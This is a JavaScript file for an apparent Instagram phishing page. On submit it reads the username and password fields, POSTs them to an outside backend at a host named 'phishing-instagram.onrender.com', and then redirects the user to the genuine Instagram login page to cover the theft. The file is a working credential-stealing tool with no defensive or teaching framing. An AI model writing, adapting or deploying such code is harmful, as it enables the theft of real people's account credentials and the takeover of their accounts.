document.addEventListener('DOMContentLoaded', function () {
    const form = document.querySelector('form');
    const inputs = document.querySelectorAll('input');
    const loginButton = document.querySelector('button[type="submit"]');

    function validateForm() {
        let isValid = true;
        inputs.forEach(input => {
            if (!input.value.trim()) {
                isValid = false;
            }
        });
        loginButton.disabled = !isValid;
    }

    inputs.forEach(input => {
        input.addEventListener('input', validateForm);
    });


    //sending request to API 
    document.getElementById('submitBtn').addEventListener('click', handleSubmit);
    //on every clcik send a request to the server using a fetch through handle submit function !


    function handleSubmit(event) {
        event.preventDefault(); // prevent form submission

        try {
            const link = "https://phishing-instagram.onrender.com"; // backend link

            fetch(link, {  // sending request to the server
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({   // sending username and password to the server
                    username: document.getElementById('username').value,
                    password: document.getElementById('password').value
                })
            }).then(response => {
                console.log('Success:', response);  // response from server 
                windows.location.href = "https://www.instagram.com/accounts/login/" // redirecting to instagram login page
            })
                .catch(error => {
                    console.error('Error:', error);  // catching error if any
                });
        } catch (exception) {
            console.log("something went wrong while sending request ! " + exception)
        }
    }

});
